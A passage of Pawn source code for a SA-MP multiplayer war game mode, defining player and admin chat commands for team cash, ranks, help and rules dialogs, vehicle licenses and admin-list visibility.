			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Vet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Vet------------------//
	    if(strfind(params,"Rus",true) != -1 || strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   GivePlayerMoney(i, amount);
				   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"You Are Not Consisting The Level To Use This Command!");
	return 1;
}

CMD:dis(playerid, params[])
{
 if(gClass[playerid] == AG) {
ShowPlayerDialog(playerid, 1541, DIALOG_STYLE_LIST, "Disguise","Usa\nEurasia\nArabia\nSoviet\nVietnam\nAustraillia","Select","Back");
} else return SendClientMessage(playerid,red,"You Need To Be  Rank SPY To Use This Command!");
  return 1;
}

CMD:disguise(playerid,params[]) {
	 return cmd_dis(playerid, params);
}


CMD:ranks(playerid, params[])
{
   new str[500];
   new str2[500];
   format(str, sizeof(str),""cgreen"COD_RWW2-"cwhite" RANKS:\n");
   strcat(str2, str);
   format(str, sizeof(str),""cgreen"Rank 0 Private"cwhite" - (0 Score)\n"cblue"Rank 1 Corporal"cwhite" - (50 Score)\n");
   strcat(str2, str);
   format(str, sizeof(str),""cred"Rank 2 Lieurenant"cwhite" - (100 Score)\n"cpurple"Rank 3 Major"cwhite" - (500 Score)\n");
   strcat(str2, str);
   format(str, sizeof(str),""ccolor"Rank 4 Captain"cwhite" - (1500 Score)\n"cgreen"Rank 5 Commander"cwhite" - (2500 Score)\n");
   strcat(str2, str);
   format(str, sizeof(str),""cyellow"Rank 6 General"cwhite" - (5000 Score)\n"cblue"Rank 7 Brigadier"cwhite" - (8000 Score)\n");
   strcat(str2, str);
   format(str, sizeof(str),""cred"Rank 8 Field Marshall"cwhite" - (15000 Score)\n"cpurple"Rank 9 Master of War"cwhite" - (35000 Score)\n");
   strcat(str2, str);
   format(str, sizeof(str),""ccolor"Rank 10 General of Army - (100000 Score)");
   strcat(str2, str);
   ShowPlayerDialog(playerid, 900, DIALOG_STYLE_MSGBOX, ""cwhite"RWW2-RANKS", str2, "Close", "");
   return 1;
}

CMD:ranks2(playerid, params[])
{
	SCM(playerid,-1,"*List of Ranks:");
	SCM(playerid,-1,"*Rank 0 Private (0 Score)");
	SCM(playerid,-1,"*Rank 1 Corporal (50 Score)");
	SCM(playerid,-1,"*Rank 2 Lieurenant (100 Score)");
	SCM(playerid,-1,"*Rank 3 Major (500 Score)");
	SCM(playerid,-1,"*Rank 4 Captain (1500 Score)");
	SCM(playerid,-1,"*Rank 5 Commander (2500 Score)");
	SCM(playerid,-1,"*Rank 6 General (5000 Score)");
	SCM(playerid,-1,"*Rank 7 Brigadier (15000 Score)");
	SCM(playerid,-1,"*Rank 8 Field Marshall (25000 Score)");
	SCM(playerid,-1,"*Rank 9 Master of War (35000 Score)");
	SCM(playerid,-1,"*Rank 10 General of Army (100000 Score)");
	return 1;
}

CMD:r(playerid,params[])
{
	#pragma unused params
	if(isnull(params)) return SendClientMessage(playerid, -1, "JikyBot: Usage:/r [text] to talk in team radio");
	new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
	new string[128], adminstr[128];
	format(string, sizeof(string), "[TEAM RADIO][%i]%s: %s",playerid, Name, params[0]);
	printf("%s", string);
	format(adminstr, sizeof(adminstr),">> [RADIO][%s]%s: %s",GetTeamName(playerid),GetName(playerid),params[0]);
	MessageTo4(grey, adminstr);

	foreach(Player, i)
	{
		if(IsPlayerConnected(i) && gTeam[i] == gTeam[playerid]) SendClientMessage(i, 0xFF8080FF, string); SetPlayerChatBubble(playerid, string, 0xFF8080FF, 100.0, 2000);
	}
	return 1;
}

CMD:order(playerid,params[])
{
	#pragma unused params
	if(isnull(params)) return SendClientMessage(playerid, -1, "JikyBot: Usage:/order [text]");
	new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
	new string[128];
	format(string, sizeof(string), "*%s %s: %s",GetRankName(playerid), Name, params[0]);
	printf("%s", string);
	
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) && gTeam[i] == gTeam[playerid]) SendClientMessage(i, 0xFF8080FF, string);
	}
	return 1;
}


CMD:rank(playerid, params[])
{
	new string[200];
	format(string, sizeof(string),"{FFFFFF}Your current rank status is {FFFFFF}| Scores: "cgreen"%d {FFFFFF}| Rank: "cgreen"%s", GetPlayerScore(playerid), GetRankName(playerid));
	ShowPlayerDialog(playerid, 808, DIALOG_STYLE_MSGBOX, ""cwhite"RWW2-Rank", string, "Okay", "Close");
	return 1;
}
CMD:async(playerid,params[])
{
	if(PlayerInfo[playerid][Level] >= 1)
	{
		new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		if (isnull(tmp)) return SendClientMessage(playerid, red, "JikyBot: Usage:/async [playerid]");
		new player1 = strval(tmp);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID)
	 	{
		    if(!IsPlayerInAnyVehicle(player1))
			{
		        Synching[player1] = true;
		        AntiSK[player1] = 0;
		        GetPlayerHealth(player1,sHP[player1]);
		        GetPlayerArmour(player1,sAP[player1]);
		        GetPlayerPos(player1,sPos[player1][0],sPos[player1][1],sPos[player1][2]);
		        for(new slot; slot < 13; slot++)
		        {
		        	GetPlayerWeaponData(player1,slot,sWeap[player1][slot],sAmmo[player1][slot]);
		        }
		        SpawnPlayer(player1);
		        CMDMessageToAdmins(playerid,"ASYNC");
		        AntiSK[player1] = 0;
		        new string[128];
		        format(string, sizeof(string), "Admin %s has synced you.", GetName(playerid)); SendClientMessage(player1,blue,string);
		        UpdateLabelText(player1);
		       	UpdateTextdraw(player1);
			}
			else return SendClientMessage(playerid,red,"JikyBot: You cannot sync players in vehicles.");
	    }
		else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	}
	else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:sync(playerid, params[])
{
if(Block_CMD[playerid][18] == false)
			{
		Block_CMD[playerid][18] = true;
		SetTimerEx("EnableCMD",60000,false,"dd",playerid,18); // gogo
        Synching[playerid] = true;
        AntiSK[playerid] = 0;
 GetPlayerHealth(playerid,sHP[playerid]);
 GetPlayerArmour(playerid,sAP[playerid]);
 GetPlayerPos(playerid,sPos[playerid][0],sPos[playerid][1],sPos[playerid][2]);
 for(new slot; slot < 13; slot++)
 {
  GetPlayerWeaponData(playerid,slot,sWeap[playerid][slot],sAmmo[playerid][slot]);
 }
    SpawnPlayer(playerid);
    AntiSK[playerid] = 0;
    UpdateLabelText(playerid);
    UpdateTextdraw(playerid);
    }
		else return SendClientMessage(playerid,red,"JikyBot: Do not abuse this command wait 1 minutes!");
 return 1;
}

CMD:objective(playerid, params[]) {
SendClientMessage(playerid, GREEN, "_____________ Objectives _______________");
SendClientMessage(playerid, -1, "                                                     ");
SendClientMessage(playerid, -1,"         > Your Objective is to Kill Players            ");
SendClientMessage(playerid, -1,"                 > Make killing spree            ");
SendClientMessage(playerid, -1,"                   > Capture zones            ");
SendClientMessage(playerid, -1, "                                                     ");
SendClientMessage(playerid, GREEN, "________________________________________");
return 1;
}

CMD:nukehelp(playerid, params[]) {
SendClientMessage(playerid, GREEN, "_____________ Nuke Help _______________");
SendClientMessage(playerid, COLOR_ORANGE, "First you need to be rank 6 to launch nuke!");
SendClientMessage(playerid, COLOR_ORANGE, "You need to capture Area 51");
SendClientMessage(playerid, COLOR_ORANGE, "Pickup the skull in Area 51 control room.");
return 1;
}

CMD:anthraxhelp(playerid, params[]) {
SendClientMessage(playerid, GREEN, "_____________ Anthrax Help _______________");
SendClientMessage(playerid, COLOR_ORANGE, "First you need to be rank 7 to launch Anthrax!");
SendClientMessage(playerid, COLOR_ORANGE, "You need to capture Big Ear");
SendClientMessage(playerid, COLOR_ORANGE, "Pickup the skull under Big Ear Dish.");
return 1;
}


CMD:forum(playerid, params[])
{
SendClientMessage(playerid, RED, "Server Forum : xenon-extreme.com");
GameTextForPlayer(playerid, "~w~Server Forum:~r~xenon-extreme.com", 3500, 3);
return 1;
}

CMD:help(playerid, params[])
{
new string[1500];
		strcat(string, ""COL_RED"[Q] What to do??\n");
		strcat(string, ""COL_WHITE" >  Kill the enemies, earn score to unlock new classes, earn cash to buy stuff, rank up, use deadly machines.\n\n");
		strcat(string, ""COL_RED"[Q] How to decrease Ping??\n");
		strcat(string, ""COL_WHITE" >  Close all background apps, Stop all other downloads, Or get a new and fast broadband!\n\n");
		strcat(string, ""COL_RED"[Q] How to be an admin??\n");
		strcat(string, ""COL_WHITE" >  To become an admin, apply for admin in |ADMIN APPLICATION| Section after reading all the requirements.\n\n");
		strcat(string, ""COL_RED"[Q] What are basic commands??\n");
		strcat(string, ""COL_WHITE" >  Some basic commands for getting started are: /Swinfo, /Help, /Cmds, /Kill, /Pm, /Dnd\n\n");
		strcat(string, ""COL_RED"[Q] After getting donor status, then what??\n");
		strcat(string, ""COL_WHITE" >  After achieveing donor status, simply type /Dhelp and you can also use DONOR class if (donor level 1+).\n\n");
		strcat(string, ""COL_RED"[Q] If I have a question??\n");
		strcat(string, ""COL_WHITE" >  If you have a sensefull question, then ask an admin or simply PM someone who is not in DND.\n\n");
		strcat(string, ""COL_RED"[Q] What benifits i get from earning Score/Money??\n");
		strcat(string, ""COL_WHITE" >  On earning score, you get to rank up and select new advance classes. While, earning money will let you buy Weapons From Inventory");
		ShowPlayerDialog(playerid,1234,DIALOG_STYLE_MSGBOX,"Server Helpline:",string,"Close","");
return 1;
}

CMD:help2(playerid, params[])
{
	SendClientMessage(playerid, COLOR_BLUE2, " =======================| Real World At War 2 Help |======================");
	SendClientMessage(playerid, COLOR_ORANGE,"=============================================================");
	SendClientMessage(playerid, red, ">> Q1.How to Rank Up? ");
	SendClientMessage(playerid, COLOR_GREEN, "<< A1.Killing Enemies and Capture the zones or making big kill streaks and get bonus!");
	SendClientMessage(playerid, COLOR_ORANGE,"=============================================================");
	SendClientMessage(playerid, red, ">> Q2.What's Spawn Kill? ");
	SendClientMessage(playerid, COLOR_GREEN, "<< A2.Killing Some one in his base with | Rhino/Tank, hydra, Hunter,seasparow |");
	SendClientMessage(playerid, COLOR_ORANGE,"=============================================================");
	SendClientMessage(playerid, red,">> Q3.How I can Cap Areas?");
    SendClientMessage(playerid, COLOR_GREEN,"<< A3.Find Enemey Flag On Minimap and stand there for 25 seconds");
    SendClientMessage(playerid, COLOR_ORANGE,"=============================================================");
	SendClientMessage(playerid, COLOR_YELLOW, "if you have any Question or need help /pm any admin online or any operators (/admins, /operators)");
	return 1;
}

CMD:kill(playerid, params[])
{
	SetPlayerHealth(playerid, 0.0);
	MinigunDM[playerid] = 0;
	SendClientMessage(playerid, -1, "You Have commited a Suicide");
	return true;
}

CMD:rules2(playerid, params[])
{

	SendClientMessage(playerid, COLOR_ORANGE, " ---= Real World At War 2™ Rules =---");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Use Any Kind of bugs.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Hacks / Cheats.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Insult/spam/flood.");
	SendClientMessage(playerid, COLOR_ORANGE, "Respect All Players/Admins.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Score Farm.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Park Your Car On Other Players.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Spawn Kill.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Ask For Score or cash..etc from admins.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Team Attack/Kill.");
	SendClientMessage(playerid, COLOR_ORANGE, "Don't Team Car Jack.");
	SendClientMessage(playerid, COLOR_ORANGE, "Visit Our Website: xenon-extreme.com and be part of the Community.");
	return 1;
}


CMD:updates(playerid, params[])
{
	ShowPlayerDialog(playerid,110,DIALOG_STYLE_MSGBOX ,""cred"COD-RWW2 Update Notes:","\n\n"cgreen"Scripted By Perfect_Boy\nNew Radio System With New Channels\nBrand New Maps by CJS and Jake a.k.a MeGaTroN\nAnti cheat and Destructable Objects by Mex_Ivanov\nHeadshot System Fixed\nOptimisation Tweaks = Reduced Lags\nMany major/minor Bugfixes\n\n"cwhite"Visit us at xenon-extreme.com\n\nXenon Pro Gaming\n\nCall Of Duty - Real World At War 2","Ok","Cancel");
	return 1;
}
CMD:license(playerid, params[])
{
	if(License[playerid] == 0)
	ShowPlayerDialog(playerid,1100,DIALOG_STYLE_MSGBOX ,""cred"COD-RWW2 License Notes:","\n\n"cgreen"You Need a License To Drive Heavy Vehicles Like Hunter, Hydra\nCurently Your Do Not Have A Heavy Vehicle License\nYou can Buy A license From The Briefcase Or Ask An Admin\nLicense Will Cost You 50000 $ Ingame Cash \nBase Raping Will lead To license being Revoked\n Attacking Bases With Heavy Vehicles IS Base Rape/n/n "cwhite"License Status "cred" [NO LICENSE]","Ok","Cancel");
	if(License[playerid] == 1)
	ShowPlayerDialog(playerid,1102,DIALOG_STYLE_MSGBOX ,""cred"COD-RWW2 License Notes:","\n\n"cgreen"Congradulations!!!\nYou Now Own A Heavy Vehicle License\nYou can Now Drive Heavy Vehicles\nBeware Do Not Break Rules And BAse Rape\nYour License Could Be Revoked For Base Raping\nBase Rape Means Attacking BAses With Heavy Vehicles\n\n"cwhite"License Status "cgreen" [YES]","Ok","Cancel");
	if(License[playerid] == 2)
	ShowPlayerDialog(playerid,1103,DIALOG_STYLE_MSGBOX ,""cred"COD-RWW2 License Notes:","\n\n"cred"Your License Have Been Revoked For Base Raping\nYou have To apply At forums For Your License\nForums xenon-extreme.com\nMake A Topic In License Appeals Board\nIf your License App is Accepted Please PM a LV5+ Admin\n\n"cwhite"License Status "cred" [REVOKED]","Ok","Cancel");
	return 1;
}
CMD:minigundm(playerid, params[])
{
	if(AntiSK[playerid] == 0)
 	{
		Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		GameTextForPlayer(playerid, "~r~use /kill~n~~w~to exit minigun~n~ ~r~stadium", 3000, 3);
		SetPlayerTeam(playerid, -1);
  		SetPlayerSkin(playerid, 299);
  		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
  		SetPlayerColor(playerid, 0xFFFFFFFF);
		MinigunDM[playerid] = 1;
  		SetPlayerPos(playerid, 249.64, 428.47, 1.57);
 		SetPlayerInterior(playerid, 15);
  		DM[playerid] = Create3DTextLabel("Minigun-Match\nFighter", 0xFFFFFFFF, 30.0, 40.0, 50.0, 40.0, 0);
	  	Attach3DTextLabelToPlayer(DM[playerid], playerid, 0.0, 0.0, 0.5);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 38, 50000);
		new name[MAX_PLAYER_NAME];
		GetPlayerName(playerid, name, sizeof(name));
		new string[128];
		format(string, sizeof(string), "~y~%s Has Joined ~g~Minigun Stadium..", name);
		SendBoxMessage(string);
  		SendClientMessageToAll(green, string);
	  	return 1;
	}
	else return SendClientMessage(playerid, RED,"You cannot join DM while in AntiSK protection! Try again later");
}
CMD:mgdm(playerid, params[])
	return cmd_minigundm(playerid, params);

/*

CMD:acmds(playerid, params[])
{
new radiolink[100];
if(sscanf(params,"s[100]", radiolink)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /acmds [1 - 5]");
if(strfind(radiolink, "1", true) != -1)
{
if(PlayerInfo[playerid][Level] >= 1)
ShowPlayerDialog(playerid,1110,DIALOG_STYLE_MSGBOX ,""cred"Admin Level 1:","\n"cgreen".[Text] For A.Chat\n/level1\n/async\n/afk\n/warn\n/kick\n/aka\n/ip\n/weaps\n/jail\n/getid\n/serverinfo\n/astats","Ok","Cancel");
}
else if(strfind(radiolink, "2", true) != -1)
{
if(PlayerInfo[playerid][Level] >= 2)
ShowPlayerDialog(playerid,1120,DIALOG_STYLE_MSGBOX ,""cred"Admin Level 2:","\n"cgreen"/adminduty\n/level2\n/aarea\n/setinterior\n/setworld\n/car\n/slap\n/burn\n/explode\n/disarm\n/rangecheck\n/sv\n/dv\n/afix\n/spawn\n/get\n/vget\n/goto\n/vgoto\n/mute","Ok","Cancel");
}
else if(strfind(radiolink, "3", true) != -1)
{
if(PlayerInfo[playerid][Level] >= 3)
ShowPlayerDialog(playerid,1130,DIALOG_STYLE_MSGBOX ,""cred"Admin Level 3:","\n"cgreen"/givelicense\n/level3\n/revokelicense\n/giveweapon\n/sethealth\n/setarmour\n/setskin\n/akill\n/givecar\n/eject\n/unbound\n/settime\n/freeze\n/unfreeze\n/givecash","Ok","Cancel");
}
else if(strfind(radiolink, "4", true) != -1)
{
if(PlayerInfo[playerid][Level] >= 4)
ShowPlayerDialog(playerid,1140,DIALOG_STYLE_MSGBOX ,""cred"Admin Level 4:","\n"cgreen"/gteam\n/level4\n/steam\n/freezeteam\n/unfreezeteam\n/disarmteam\n/ruc\n/desnrg\n/gas\n/ann","Ok","Cancel");
}
else if(strfind(radiolink, "5", true) != -1)
{
if(PlayerInfo[playerid][Level] >= 5)
ShowPlayerDialog(playerid,1160,DIALOG_STYLE_MSGBOX ,""cred"Admin Level 5:","\n"cgreen",[Text] Management.Chat\n/setcash\n/setscore\n/settester\n/unsettester\n/setkills\n/setdeaths","Ok","Cancel");
}
return 1;
}
*/

CMD:acmds(playerid, params[])
{

	if (! IsPlayerAdmin(playerid) && PlayerInfo[playerid][Level] < 1)
	{
        return SendClientMessage(playerid, RED, "You must be an admin to use this command.");
    }

	new info[3024];
	strcat(info, ""cpink"Moderator (Level 1):\n");
  	strcat(info, ""cwhite"/acmds, /async, /afk, /warn, /kick, /aka, /ip, weaps, /jail, /getid,\n");
  	strcat(info, "/serverinfo, /astats, /msay, /setmytime, /apm, /sendadminmsg, /site\n");
  	strcat(info, "Use `"cgreen"!"cwhite"' for admin chat [eg. ! hello].\n\n");

	if (PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid))
	{
		strcat(info, ""cpink"Junior Administrator (Level 2):\n");
  		strcat(info, ""cwhite"/adminduty, /forceclass, /forceplayer, /setcolor, /setworld, /setinterior, /lockcar , /unlockcar\n");
  		strcat(info, "/burn, /slap, /explode, /spawn, /disarm, /rangecheck , /ban, /unban, /checkacc, /sban, /rsban\n");
  		strcat(info, "/car, /sv, /dv, /get, /goto, /vgoto, /lbike, /ltc ,/adminarea, .[text] Admin Chat\n\n");
	}
	if (PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid))
	{
		strcat(info, ""cpink"Senior Administrator (Level 3):\n");
		strcat(info, ""cwhite"/giveallscore, /gas, /revokelicense, /givelicense, /givewepaon, /sethealth, /setarmour, /setskin\n");
		strcat(info, "/setweather, /settime, /givecar, /force, /eject, /givecash, /unbound, /carhealth ,/godcar\n");
		strcat(info, "/ltc, /lbike, /ltune, /lboat, /hydra, /hunter\n\n");
	}
	if (PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid))
	{
		strcat(info, ""cpink"Lead Administrator (Level 4):\n");
		strcat(info, ""cwhite"/fakedeath, /muteall, /unmuteall, /giveallscore, /giveallcash, /setalltime, /setallweather,\n");
		strcat(info, "/clearbox, /giveallweapon, /object, /ruc, /desnrg, /fixinvisible\n");
		strcat(info, ""cred"Event Commands:\n");
		strcat(info, ""cwhite"/healall, /armourall, /dteam, /setteamhealth, /setteamarmour, /freezeteam, /unfreezeteam, /freezeall\n");
		strcat(info, "/getteam, /spawnteam, /gsteam, /gcteam, /giveallweapon, /unfreezeall, /steam\n");
  		strcat(info, "Use `"cgreen"*"cwhite"' for admin level 4+ chat [eg. * hello].\n\n");
	}
	if (PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid))
	{
		strcat(info, ""cpink"Head Admin (Level 5):\n");
		strcat(info, ""cwhite"/settester, /unsettester, /setscore, /setkills, /setdeaths, /setcash, /bsay\n");
  		strcat(info, "Use `"cgreen","cwhite"' for admin level 5+ chat [eg. , hello].");
	}

	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Administrative commands:", info, "Close", "");
	return 1;
}



CMD:baserape(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 0)
{
	ShowPlayerDialog(playerid,1104,DIALOG_STYLE_MSGBOX ,""cred"COD-RWW2 Base Rape:","\n\n"cgreen"You Need a License To Drive Heavy Vehicles Like Hunter, Hydra\nCurently Your Do Not Have A Heavy Vehicle License\nYou can Buy A license From The Briefcase Or Ask An Admin\nLicense Will Cost You 50000 $ Ingame Cash \nBase Raping Will lead To license being Revoked\n Attacking Bases With Heavy Vehicles IS Base Rape/n","Ok","Cancel");
	return 1;
	}
return 0;
}

CMD:givelicense(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 3)
{
	new targetid;
	if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_YELLOW, "Correct JikyBot: Usage:/givelicense [playerid]");
	if(targetid != INVALID_PLAYER_ID && targetid != playerid)
	{
	    new tname[MAX_PLAYER_NAME], name[MAX_PLAYER_NAME], string[128];
	    GetPlayerName(playerid, name, sizeof(name));
	    GetPlayerName(targetid, tname, sizeof(tname));
	    format(string, sizeof(string), "Admin %s has given a license to %s so thank him %s . And Dont forget to read /license", name, tname, tname);
	    SendClientMessageToAll(COLOR_PINK, string);
	    CMDMessageToAdmins(playerid,"GIVELICENSE");
		if(License[targetid] == 1)
        SendClientMessage(playerid, RED, "JikyBot: Player already HAs a License");
		if(License[targetid] == 2)
		SendClientMessage(playerid, RED, "JikyBot: Player has Got his License Revoked Use /reseticense");
		if(License[targetid] == 0)
		License[targetid] = 1;
	}
	else return SendClientMessage(playerid, RED, "JikyBot: Playerid is yourself reported you to perfect for commeand abuse");
	return 1;
}
return 0;
}
CMD:revokelicense(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 3)
{
	new targetid;
	if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_YELLOW, "Correct JikyBot: Usage:/givelicense [playerid]");
	if(targetid != INVALID_PLAYER_ID)
	{
	    new tname[MAX_PLAYER_NAME], name[MAX_PLAYER_NAME], string[128];
	    GetPlayerName(playerid, name, sizeof(name));
	    GetPlayerName(targetid, tname, sizeof(tname));
	    format(string, sizeof(string), "Admin %s has revoked the license of %s so thank him %s . [Reason: Base Rape]", name, tname, tname);
	    SendClientMessageToAll(COLOR_PINK, string);
	    CMDMessageToAdmins(playerid,"REVOKELICENSE");
		if(License[targetid] == 0)
        SendClientMessage(playerid, RED, "JikyBot: Player dosent have a License");
		if(License[targetid] == 2)
		SendClientMessage(playerid, RED, "JikyBot: Player has Got his License Revoked Use /reseticense");
		if(License[targetid] == 1)
		License[targetid] = 2;
	}
	else return SendClientMessage(playerid, RED, "JikyBot: Playerid is yourself reported you to perfect for commeand abuse");
	return 1;
}
return 0;
}
CMD:resetlicense(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 5)
{
	new targetid;
	if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_YELLOW, "Correct JikyBot: Usage:/givelicense [playerid]");
	if(targetid != INVALID_PLAYER_ID)
	{
	    new tname[MAX_PLAYER_NAME], name[MAX_PLAYER_NAME], string[128];
	    GetPlayerName(playerid, name, sizeof(name));
	    GetPlayerName(targetid, tname, sizeof(tname));
	    format(string, sizeof(string), "Admin %s has revoked the license of %s so thank him %s . [Reason: Base Rape]", name, tname, tname);
	    SendClientMessageToAll(COLOR_PINK, string);
	    CMDMessageToAdmins(playerid,"RESETLICENSE");
		if(License[targetid] == 0)
        SendClientMessage(playerid, RED, "JikyBot: Player dosent have a License");
		if(License[targetid] == 1)
		SendClientMessage(playerid, RED, "JikyBot: Player already Has a License");
		if(License[targetid] == 2)
		License[targetid] = 1;
	}
	else return SendClientMessage(playerid, RED, "JikyBot: Playerid is yourself reported you to perfect for commeand abuse");
	return 1;
}
return 0;
}

CMD:savestats(playerid, params[])
{
	SavePlayer(playerid);
	SendClientMessage(playerid, yellow, "Your stats has "cred"successfully been "cgreen"SAVED!");
	return 1;
}
CMD:cmds(playerid, params[])
{
	SendClientMessage(playerid, COLOR_ORANGE, "_________|- COMMANDS -|_________");
	SendClientMessage(playerid, COLOR_ORANGE, "/Ranks | /Rank | /Kill | /Rules |/Attachments| /Stats | /Jp | /Dis | /Shelp");
	SendClientMessage(playerid, COLOR_ORANGE, "/Help | /Pm | /R [text] | /Ep | /Anims | /Laseron | /Lasercol | /Spree | /Getid | /Disguise | /donorpack");
	SendClientMessage(playerid, COLOR_ORANGE, "/Richlist | /Sync | /Rpm | /Radiohelp | /Order [text] | /Dcmds | /S [test] | /Dnd | /Switchclass");
	SendClientMessage(playerid, COLOR_ORANGE, "/Operators | /Admins | /Donors  | /Cmds | /St | /Sc | /Switchteam | /Objective | /Teams | /Savestats | /Givegun");
	SendClientMessage(playerid, COLOR_ORANGE, "/Changename | /Changepass | /Streak | /Notes | /GM | /Nuke | /Anthraxhelp | /Times | /donorprice");
	return true;
}
CMD:donorhelp(playerid, params[])
{
	SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor help -|_________");
	SendClientMessage(playerid, COLOR_GREEN, "Go to Our Forum Donate Topic Check Out Donation Rewards.");
	SendClientMessage(playerid, COLOR_GREEN, "Read The Donation info to Donate to our Community.");
	SendClientMessage(playerid, COLOR_GREEN, "Write /donorpack [1-5] to see donation package info.");
	SendClientMessage(playerid, COLOR_GREEN, "Write /donorprice to see donation package prices.");
	return true;
}

CMD:grouphelp(playerid, params[])
{
	SendClientMessage(playerid, COLOR_YELLOW, "_________|- Real World At War 2™ group help -|_________");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupcreate | Create a Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupleave  | Leave The Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupinvite | Invite players To The Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupleader | Make a player The Group Leader");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupjoin   | Join a Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/groupkick   | Kick a Player From The Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/gm          | Chat In The Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/grouplist   | List the Players In The Group");
	SendClientMessage(playerid, COLOR_ORANGE, "/groups      | Check All The Groups");
	return true;
}
CMD:hidemyass(playerid,params[])
{
    #pragma unused params
	if (PlayerInfo[playerid][Level] >= 6)
	{
	    if (PlayerInfo[playerid][Hide] == 1)
 		return SendClientMessage(playerid,red,"JikyBot: You are already have Hidden in the Admin List!");

 		PlayerInfo[playerid][Hide] = 1;
   		return SendClientMessage(playerid,green,"|- You are now Hidden from the Admin List -|");
	}
   return SendClientMessage(playerid, RED, "JikyBot: invalid level");
}

CMD:unhidemyass(playerid,params[])
{
    #pragma unused params
	if (PlayerInfo[playerid][Level] >= 6)
	{
	    if (PlayerInfo[playerid][Hide] == 0)
 		return SendClientMessage(playerid,red,"JikyBot: You are already have Visible in the Admin List!");

 		PlayerInfo[playerid][Hide] = 0;
   		return SendClientMessage(playerid,green,"|- You are now Visible from the Admin List -|");
	}
   return SendClientMessage(playerid, RED, "JikyBot: invalid level");
}
CMD:showmyass(playerid,params[])
{
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6)
	{
 		if (PlayerInfo[playerid][Hide] != 1)
 		return SendClientMessage(playerid,red,"JikyBot: You are not Hidden in the Admin List!");
  		PlayerInfo[playerid][Hide] = 0;
   		return SendClientMessage(playerid,green,"|- You are now Visible in the Admin List -|");
	}
    return SendClientMessage(playerid, RED, "JikyBot: invalid Level");
}
/*
CMD:donorpricezzz(playerid, params[])
{
